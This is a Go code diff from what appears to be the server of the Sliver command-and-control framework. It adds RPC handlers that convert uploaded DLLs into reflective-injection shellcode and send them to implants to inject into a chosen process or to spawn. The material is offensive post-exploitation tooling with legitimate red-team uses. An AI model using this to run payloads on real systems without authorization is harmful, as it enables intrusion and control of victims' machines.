@@ -63,7 +63,7 @@ func rpcMigrate(req []byte, timeout time.Duration, resp RPCResponse) {
 		resp([]byte{}, err)
 		return
 	}
-	shellcode, err := generate.ShellcodeRDI(dllPath, "RunSliver")
+	shellcode, err := generate.ShellcodeRDI(dllPath, "RunSliver", "")
 	if err != nil {
 		resp([]byte{}, err)
 		return
@@ -110,4 +110,45 @@ func rpcExecuteAssembly(req []byte, timeout time.Duration, resp RPCResponse) {
 	data, err = sliver.Request(sliverpb.MsgExecuteAssemblyReq, timeout, data)
 	resp(data, err)
 
+}
+
+func rpcSideload(req []byte, timeout time.Duration, resp RPCResponse) {
+	sideloadReq := &clientpb.SideloadReq{}
+	err := proto.Unmarshal(req, sideloadReq)
+	if err != nil {
+		rpcLog.Warn("Error unmarshaling SideloadReq: %v", err)
+		resp([]byte{}, err)
+		return
+	}
+	sliver := core.Hive.Sliver(sideloadReq.SliverID)
+	if sliver == nil {
+		rpcLog.Warnf("Could not find Sliver with ID: %d", sideloadReq.SliverID)
+		resp([]byte{}, err)
+		return
+	}
+	shellcode, err := generate.ShellcodeRDIFromBytes(sideloadReq.Data, sideloadReq.EntryPoint, sideloadReq.Args)
+	if err != nil {
+		resp([]byte{}, err)
+		return
+	}
+	data, _ := proto.Marshal(&sliverpb.SideloadReq{
+		SliverID: sideloadReq.SliverID,
+		Data:     shellcode,
+		ProcName: sideloadReq.ProcName,
+	})
+	data, err = sliver.Request(sliverpb.MsgSideloadReq, timeout, data)
+	resp(data, err)
+
+}
+
+func rpcSpawnDll(req []byte, timeout time.Duration, resp RPCResponse) {
+	spawnReq := &sliverpb.SpawnDllReq{}
+	err := proto.Unmarshal(req, spawnReq)
+	if err != nil {
+		resp([]byte{}, err)
+		return
+	}
+	sliver := core.Hive.Sliver(spawnReq.SliverID)
+	data, err := sliver.Request(sliverpb.MsgSpawnDllReq, timeout, req)
+	resp(data, err)
 }
